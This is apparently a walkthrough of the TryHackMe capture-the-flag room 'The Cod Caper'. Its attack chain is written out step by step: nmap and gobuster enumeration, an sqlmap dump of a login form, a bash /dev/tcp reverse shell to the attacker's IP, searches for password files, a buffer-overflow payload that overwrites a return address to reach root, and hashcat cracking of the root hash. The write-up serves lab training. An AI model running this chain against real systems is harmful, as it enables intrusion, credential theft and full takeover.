# The Cod Caper

## Task 1: Host Enumeration

Scan all ports and gather information about the target machine.

```bash
nmap -sC -T4 -A -p- <TARGET_IP>
```

**Hint:** Identify open ports, running services, and service versions.

## Task 2: Web Enumeration

Use Gobuster to discover hidden directories and files. FFUF is another alternative.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/big.txt -x php,txt,html
```

**Finding:** `administrator.php`

## Task 3: Web Exploitation

Open `administrator.php` in the browser and inspect the login form.

Use SQLMap to test the form for SQL injection and enumerate database information.

```bash
sqlmap -u "http://<TARGET_IP>/administrator.php" --forms --dump --batch
```

**Finding:**
- Username
- Password
- Three SQL injection techniques identified.

## Task 4: Command Execution

Use the discovered credentials to access the command execution interface.

Start a Netcat listener on Kali:

```bash
nc -lvnp 4444
```

Execute the reverse shell command on the target:

```bash
bash -c 'bash -i >& /dev/tcp/<YOUR_TUN0_IP>/4444 0>&1'
```

**Hint:** Replace `<YOUR_TUN0_IP>` with your TryHackMe VPN interface IP.

Check access:

```bash
whoami
ls -la
```

Find Pingu's password:

```bash
find / -name "*pass*" 2>/dev/null
cat /var/hidden/pass
```

## Task 5: LinEnum

Transfer LinEnum from your Kali machine to the target using SCP.

```bash
scp /opt/LinEnum.sh pingu@<TARGET_IP>:/tmp/
```

Run LinEnum on the target:

```bash
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh
```

Search for SUID binaries:

```bash
find / -type f -perm -4000 2>/dev/null
```

**Hint:** Look for interesting SUID binaries that could allow privilege escalation.

## Task 6: Pwndbg

Analyze the vulnerable binary using GDB and Pwndbg.

```bash
gdb /opt/secret/root
```

Generate a cyclic pattern:

```bash
r < <(cyclic 50)
```

Find the offset:

```bash
cyclic -l 0x6161616c
```

Disassemble the shell function:

```bash
disassemble shell
```

Exit GDB:

```bash
q
```

## Task 7: Manual Binary Exploitation

Use a Python payload to overwrite the return address and redirect execution to the `shell` function.

```bash
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

**Finding:** Successfully redirected execution and obtained the root password hash.

## Task 8: Finishing the Job

Save the extracted root password hash:

```bash
echo '<HASH>' > hash.txt
```

Crack the hash using Hashcat and the RockYou wordlist:

```bash
hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

**Hint:** Hashcat mode `1800` is for SHA512crypt hashes.

Submit the recovered password.

## Techniques & Tools

- **Reconnaissance:** Nmap
- **Directory Enumeration:** Gobuster
- **SQL Injection:** SQLMap
- **Reverse Shell:** Netcat
- **Linux Enumeration:** LinEnum
- **SUID Enumeration:** Find
- **Binary Analysis:** GDB / Pwndbg
- **Buffer Overflow:** Cyclic Pattern
- **Password Cracking:** Hashcat
